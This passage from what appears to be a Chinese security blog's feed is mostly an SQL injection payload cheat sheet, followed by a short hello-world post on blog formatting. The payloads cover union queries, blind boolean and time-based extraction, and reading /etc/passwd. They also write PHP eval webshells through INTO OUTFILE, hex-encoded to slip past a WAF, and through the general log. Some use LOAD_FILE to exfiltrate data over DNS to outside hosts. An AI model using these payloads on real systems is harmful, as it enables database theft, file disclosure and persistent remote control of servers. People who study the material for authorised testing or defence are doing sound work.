class="line">select table_name from information_schema where table_schema =&quot;security&quot;;</span><br></pre></td></tr></table></figure><p>找一个表中有哪些列名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select column_name from information_schema where table_name =&quot;eamils&quot;;</span><br></pre></td></tr></table></figure><h3 id="AND与OR的区别"><a href="#AND与OR的区别" class="headerlink" title="AND与OR的区别"></a>AND与OR的区别</h3><p>需要理解 and和or的区别</p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/1.png" alt="1"></p><p>场景举例：</p><p>没有订单可以测的情况下，只能用or</p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/2.png" alt="2"></p><h3 id="union联合查询注入"><a href="#union联合查询注入" class="headerlink" title="union联合查询注入"></a>union联合查询注入</h3><p>当union前面的语句为false时才会执行后面语句（这里一定先学习union查询的用法）</p><p>如以下，union语句前 先构建一个错误条件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.vuln.cn/sql/less-1/?id=1&#x27; and 1=2 union select 1,user(),database() --+</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.vuln.cn/sql/less-1/?id=-1&#x27; union select 1,user(),database() --+</span><br></pre></td></tr></table></figure><p>union与order by 后面跟着的列数是跟前面的select 列数相同的，不是该表的总列数</p><p>总列数判断为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.vuln.cn/sql/less-10/?id=1&quot; and  if((select count(*) from information_schema.columns where table_name = &quot;emails&quot;)=2,sleep(5),1) --+</span><br></pre></td></tr></table></figure><p>解释：如果列数为2，则延时5秒响应。</p><p>判断某列是否存在也可以用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.vuln.cn/sql/less-10/?id=1&quot; and exists (select username from admin)</span><br></pre></td></tr></table></figure><p><strong>当union查同库其他表时，需要知道库名：</strong></p><p>如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.vuln.cn/?id=-1 uni%00on se%00lect id,hash fr%00om sql3.key</span><br></pre></td></tr></table></figure><h3 id="读文件-写shell"><a href="#读文件-写shell" class="headerlink" title="读文件/写shell"></a>读文件/写shell</h3><p>这里包含了网上常见或不常见的导出一句话的骚操作</p><h4 id="支持union的方法，最常规的方式："><a href="#支持union的方法，最常规的方式：" class="headerlink" title="支持union的方法，最常规的方式："></a>支持union的方法，最常规的方式：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.vuln.cn/sql/less-10/?id=-1&quot; union select 1,user(),3 into outfile &quot;C:\\test.txt&quot; --+</span><br></pre></td></tr></table></figure><h4 id="16进制写shell"><a href="#16进制写shell" class="headerlink" title="16进制写shell"></a>16进制写shell</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.vuln.cn/sql/less-10/?id=-1&quot; union select 0x3c,0x3f,0x6576616C28245F504F53545B785D293B3F3E into outfile &quot;C:\\test.php&quot; --+</span><br></pre></td></tr></table></figure><p>其中上面的16 进制组合成的是一个一句话，其实这样的sql可以过waf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;    ?   eval($_POST[x]);?&gt;</span><br></pre></td></tr></table></figure><p><strong>利用分隔符写shell</strong></p><p>如果不支持union，可以用分隔符导出一句话，当然字段数要大于2。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from admin where id=1 into outfile ‘F:\WWW\phpinfo.php’ fields terminated by ‘&lt;? phpinfo(); ?&gt;’%23     #分隔符也可以用16进制表示</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select exp(~(select * from(select &#x27;hello&#x27;)a)) into outfile &#x27;C:/out.txt&#x27;;  //但是只能写一个0进去。</span><br></pre></td></tr></table></figure><p><strong>修改sql日志路径到web下的一个php文件</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%general%&#x27;;  #查看配置set global general_log = on;  #开启general log模式set global general_log_file = &#x27;/var/www/html/1.php&#x27;;   #设置日志目录为shell地址 select &#x27;&lt;?php eval($_POST[cmd]);?&gt;&#x27;  #写入shell</span><br></pre></td></tr></table></figure><p><strong>读文件：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select exp(~(select*from(select load_file(&#x27;/etc/passwd&#x27;))a));</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; UPDATE table_test</span><br><span class="line">    -&gt; SET blob_col=LOAD_FILE(&#x27;/tmp/picture&#x27;)</span><br><span class="line">        -&gt; WHERE id=1;</span><br></pre></td></tr></table></figure><h3 id="基于布尔值的盲注"><a href="#基于布尔值的盲注" class="headerlink" title="基于布尔值的盲注"></a>基于布尔值的盲注</h3><p>可以通过响应的不同可以判断sql语句是否正确</p><p>枚举字符来判断字符是否存在</p><p><strong>mysql的一些特征：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1 from information_schema.tables where table_schema=&quot;security&quot;；     这种情况后面只要为真，就会返回1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1 from information_schema.tables where table_schema=&#x27;security&#x27; and table_name regexp &#x27;^us[a-z]&#x27; limit 0,1;</span><br></pre></td></tr></table></figure><p>当试探第二个表的时候并不是改为limit1,1，因为limit针对的是条件筛选后的过滤，所以测试其他表的时候，继续修改正则即可，如果us[a-z]为1，ua[a-z]，说明至少有两个表，一个表以us开头，另一个ua开头</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ascii(substr((select table_name information_schema.tables where tables_schema=database()limit 0,1),1,1))=101    这种情况取第二个表的时候就需要limit 2,1了，因为表的排序是固定不会变的</span><br><span class="line"></span><br><span class="line">select user() like ‘ro%’，有匹配的时候会返回1，</span><br></pre></td></tr></table></figure><p>标准的正则布尔测试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema=&#x27;security&#x27; and table_name regexp &#x27;^us[a-z]&#x27; limit 0,1);</span><br></pre></td></tr></table></figure><p>比如判断数据库版本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.vuln.cn/sqllib/Less-5/?id=1%27and%20left(version(),1)=5%23</span><br></pre></td></tr></table></figure><p>判断是否条件成立的其他方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.vuln.cn/index.php?a=examtraining&amp;c=index&amp;id=1 and (ord(substr(database() ,1,1))-1010) &amp;m=member&amp;type=TF</span><br></pre></td></tr></table></figure><h3 id="盲注流程"><a href="#盲注流程" class="headerlink" title="盲注流程"></a>盲注流程</h3><p><strong>获取库名：</strong></p><p>and%20ord(substr(database(),1,1))&gt;80+–+</p><p><strong>获取表名：</strong></p><p>利用 substr() ascii()函数进行尝试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.vuln.cn/sqllib/Less-5/?id=1%27and ascii(substr((select table_name information_schema.tables where tables_schema=database() limit 0,1),1,1))=101</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.vuln.cn/sqllib/Less-5/?id=1%27and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;80--+</span><br></pre></td></tr></table></figure><p><strong>获取字段名：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.vuln.cn/sqllib/Less-5/?id=1&#x27; and 1=(select 1 from information_schema.columns where table_name=&#x27;users&#x27; and column_name regexp &#x27;^username&#x27; limit 0,1)--+</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and ord(substr((select column_name from information_schema.columns where table_name=&quot;emails&quot; limit 0,1),1,1))=105+--+</span><br></pre></td></tr></table></figure><p><strong>获取表数据：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.vuln.cn/sqllib/Less-5/?id=1%27 and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))= 68--+</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and ord(mid((select id from emails order by id limit 0,1),1,1))&lt;105+--+</span><br></pre></td></tr></table></figure><p>通过dns获取盲注数据：<a href="http://www.vuln.cn/6805">http://www.vuln.cn/6805</a></p><p>由于union后必须跟上与前面同样的字段数，所以需要把load_file放在其中，非union直接select load_file即可</p><p>dns获取盲注数据示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.vuln.cn/SQL/Less-8/?id=1%27+union select 1,LOAD_FILE(CONCAT(&#x27;\\\\&#x27;,(select id from emails limit 0,1),&#x27;.t00ls.af6160db0692ac54d19b613b0b01a78c.tu4.org\\foobar&#x27;)),3 --+</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/SQL/Less-9/?id=1%27+union select 1,LOAD_FILE(CONCAT(&#x27;\\\\&#x27;,database(),&#x27;.t00ls.af6160db0692ac54d19b613b0b01a78c.tu4.org\\foobar&#x27;)),3 --+</span><br></pre></td></tr></table></figure><p>\foobar  后面要有一串任意字符，访问远程目录的意思，所以这个“foobar”可以用任意字符替换。</p><p>还可以：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id from admin where id=1 and if((select load_file(concat(&#x27;\\\\&#x27;,(select database()),&#x27;.ceye.io\\abc&#x27;))),1,1);</span><br></pre></td></tr></table></figure><h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><p>适用于当我们测试的时候没有任何回显来判断是否有注入，比如订单搜索，比如当sql错误的时候返回与正确的相同，我们就无法通过回显差异来判断注入</p><p>如下图代码，成立与否页面不变化</p><p><strong>延时注入</strong></p><p>适用于当我们测试的时候没有任何回显来判断是否有注入，比如订单搜索，比如当sql错误的时候返回与正确的相同，我们就无法通过回显差异来判断注入</p><p>如下图代码，成立与否页面不变化</p><p><img src="https://gitee.com/zrzuishuai/pictures/raw/master/images/3.png" alt="3"></p><p>所以就需要通过判断是否延时来确认是否有注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.vuln.cn/sqllib/Less-9/?id=1&#x27;and If(ascii(substr((select column_name from information _schema.columns where table_name=&#x27;users&#x27; limit 0,1),1,1))=105,1,sleep(5))--+</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.vuln.cn/sql/less-9/?id=1&#x27; and if((ord(substr(user(),1,1))=114),sleep(5),1) --+</span><br></pre></td></tr></table></figure><p>如果过滤逗号，可以：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show fields from `tiny_nav` where field=&#x27;id&#x27; and sleep((&#x27;a&#x27;=(select name from tiny_manager where id=3 union select &#x27;a&#x27; order by 1 limit 1))*5)</span><br></pre></td></tr></table></figure><p>还可以利用 union select 加 order by 逐字猜解…</p><p>假设，name 是 admin</p><p>当 猜出第一个字母为 ‘a’ 时，’a’=’a’及真。用 0，1表示的话就是1，然后 sleep(1<em>5)，如果是假，那就是sleep(0</em>5)…</p><p>先基本判断有没有延时，然后在load_file来dns查询</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.vuln.cn/SQL/Less-8/?id=1%27+and sleep(5) --+</span><br></pre></td></tr></table></figure><p>可以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.www.vuln.cn/sql/less-10/?id=1&quot; and sleep(5) order by 8 --+</span><br></pre></td></tr></table></figure><h3 id="post注入"><a href="#post注入" class="headerlink" title="post注入"></a>post注入</h3><p>最大的区别在于注释符的使用，and改为or而已</p><p>如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;) or (ord(substr(user(),1,1))&gt;1#</span><br></pre></td></tr></table></figure><p>参考文章：<a href="https://www.freebuf.com/articles/web/282145.html">https://www.freebuf.com/articles/web/282145.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;mysql基本hack函数：&quot;&gt;&lt;a href=&quot;#mysql基本hack函数：&quot; class=&quot;headerlink&quot; title=&quot;mysql基本hack函数：&quot;&gt;&lt;/a&gt;mysql基本hack函数：&lt;/h3&gt;&lt;p&gt;mid&lt;/p&gt;
&lt;p&gt;SELECT MID(</summary>
      
    
    
    
    <category term="渗透" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="sql 注入" scheme="http://example.com/tags/sql-%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>hello-world</title>
    <link href="http://example.com/2021/05/02/my-first-blog/"/>
    <id>http://example.com/2021/05/02/my-first-blog/</id>
    <published>2021-05-02T09:30:00.000Z</published>
    <updated>2021-08-05T07:43:50.000Z</updated>
    
    <content type="html"><![CDATA[<p>Hello, World是指在电脑屏幕显示“Hello, World!”（你好，世界！）字符串的计算机程序。相关的程序通常都是每种电脑编程语言最基本、最简单的程序，也会用作示范一个编程语言如何运作。同时它亦可以用来确认一个编程语言的编译器、程序开发环境及运行环境是否已经安装妥当。因为写法简单可见，这也是很多初学者首次接触编程语言时会撰写的程序。</p><div class="alert alert-success"><p>成功啦o(<em>￣▽￣</em>)ブ</p></div><div class="alert alert-danger"><p>有危险Σ(っ °Д °;)っ</p></div><div class="alert alert-info"><p>有消息(・∀・(・∀・(・∀・*)</p></div><div class="alert alert-warning"><p>当心哦≧ ﹏ ≦</p></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% alertbox success &quot;成功啦o(*￣▽￣*)ブ&quot; %&#125;</span><br><span class="line">&#123;% alertbox danger &quot;有危险Σ(っ °Д °;)っ&quot; %&#125;</span><br><span class="line">&#123;% alertbox info &quot;有消息(・∀・(・∀・(・∀・*)&quot; %&#125;</span><br><span class="line">&#123;% alertbox warning &quot;当心哦≧ ﹏ ≦&quot; %&#125;</span><br></pre></td></tr></table></figure><div class="xControl">    <div class="xHeading"><div class="xIcon"><i class="fa fa-plus"></i></div><span>折叠框的标题</span></div>    <div class="xContent"><div class="inner">        <p>被折叠的内容 1<br>被折叠的内容 2<br>…</p>     </div></div>    </div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% collapse 折叠框的标题 %&#125;</span><br><span class="line"></span><br><span class="line">被折叠的内容 1</span><br><span class="line">被折叠的内容 2</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&#123;% endcollapse %&#125;</span><br></pre></td></tr></table></figure><p>TYPE是面板框的类型，可以是：</p><p>successs<br>danger<br>info<br>warning</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% colorpanel TYPE 面板框的标题 %&#125;</span><br><span class="line"></span><br><span class="line">面板里的内容 1</span><br><span class="line">面板里的内容 2</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&#123;% endcolorpanel %&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Hello, World是指在电脑屏幕显示“Hello, World!”（你好，世界！）字符串的计算机程序。相关的程序通常都是每种电脑编程语言最基本、最简单的程序，也会用作示范一个编程语言如何运作。同时它亦可以用来确认一个编程语言的编译器、程序开发环境及运行环境是否已经安装</summary>
      
    
    
    
    <category term="日常" scheme="http://example.com/categories/%E6%97%A5%E5%B8%B8/"/>
    
    
  </entry>
  
</feed>
